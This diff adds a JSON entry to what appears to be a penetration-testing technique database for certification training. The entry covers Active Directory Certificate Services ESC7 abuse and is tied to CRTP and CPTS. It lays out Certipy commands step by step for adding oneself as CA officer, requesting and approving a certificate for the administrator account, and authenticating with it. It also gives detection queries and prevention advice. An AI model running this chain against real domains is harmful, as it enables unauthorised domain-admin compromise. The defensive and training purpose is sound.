@@ -1,0 +1,101 @@
+{
+  "id": "ad-adcs-esc7-ca-officer",
+  "name": "ADCS ESC7 - CA Officer / ManageCA Abuse",
+  "command": "certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <pass>",
+  "description": "ESC7 exploits ManageCA or ManageCertificates permissions on the CA server. With ManageCA, you can add yourself as a CA Officer and enable the SAN (Subject Alternative Name) flag on templates. With ManageCertificates (Certificate Officer), you can approve pending certificate requests. Combined, these enable requesting certs as any user.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps Certified Pre-Owned; Certipy",
+  "tags": [
+    "adcs",
+    "esc7",
+    "manage-ca",
+    "ca-officer",
+    "certificate-template",
+    "san-flag"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONDITIONS ===\nYou have ManageCA or ManageCertificates permission on the CA.\n\n=== STEP 1: ADD YOURSELF AS OFFICER ===\n  certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <pass>\n\n=== STEP 2: ENABLE SUBJECTALTNAME FLAG ===\n  certipy ca -ca <ca_name> -enable-template SubCA -u <user>@<domain> -p <pass>\n  # Or enable SAN on an existing template\n\n=== STEP 3: REQUEST CERT WITH SAN ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template SubCA -upn administrator@<domain>\n  # Request will be pending (needs officer approval)\n\n=== STEP 4: APPROVE AS OFFICER ===\n  certipy ca -ca <ca_name> -issue-request <request_id> -u <user>@<domain> -p <pass>\n\n=== STEP 5: RETRIEVE AND AUTH ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -retrieve <request_id>\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== ALTERNATIVE: ManageCertificates only ===\nIf you only have ManageCertificates, you can approve pending\nrequests but not add officers or enable SAN. Look for templates\nthat already allow SAN or have pending requests.",
+  "examples": [
+    {
+      "label": "Add yourself as CA Officer",
+      "command": "certipy ca -ca corp-CA -add-officer jdoe -u jdoe@corp.local -p Password123"
+    },
+    {
+      "label": "Request cert with admin SAN",
+      "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template SubCA -upn administrator@corp.local"
+    },
+    {
+      "label": "Approve pending request",
+      "command": "certipy ca -ca corp-CA -issue-request 123 -u jdoe@corp.local -p Password123"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "Certipy ESC7",
+      "url": "https://github.com/ly4k/Certipy#esc7"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-adcs-esc6-editf-flag",
+      "note": "ESC6 enables SAN globally; ESC7 uses officer permissions to enable it per-template.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-forgecert",
+      "note": "ForgeCert for persistence after obtaining CA access via ESC7.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "ManageCA permission grants control over the CA configuration, including adding Certificate Officers and enabling template flags. ManageCertificates permission allows approving certificate requests that would otherwise be pending.",
+    "prerequisites": "ManageCA or ManageCertificates permission on the ADCS CA server.",
+    "impact": "Domain admin compromise by issuing certificates with arbitrary SANs.",
+    "detection": "[MITRE T1649] CA configuration changes; new officer assignments; certificate approvals for templates that normally require admin.",
+    "artifacts": "CA audit logs showing officer addition; certificate request and approval events; Event 4886/4887.",
+    "splunk_spl": "index=windows source=\"CertificationAuthority\" (EventCode=4890 OR EventCode=4892)\n| table _time, EventCode, Message",
+    "elastic_kql": "event.code:(\"4890\" OR \"4892\") AND event.provider:\"CertificationAuthority\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4890, 4892)\n| project TimeGenerated, EventID, EventData",
+    "sigma_rules": "win_security_adcs_esc7_officer_abuse",
+    "prevention": "Restrict ManageCA and ManageCertificates permissions; enable CA audit logging; monitor officer changes; require manager approval for sensitive templates.",
+    "sources": [
+      "SpecterOps research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC7 - CA Officer added or certificate issued by new officer",
+        "logic": "SecurityEvent\n| where EventID in (4890, 4892)\n| project TimeGenerated, EventID, EventData\n| extend Detail = tostring(EventData)",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4890",
+          "4892"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate CA administration",
+        "tuning": "Baseline normal CA officer activities; alert on new officer assignments"
+      }
+    ]
+  }
+}
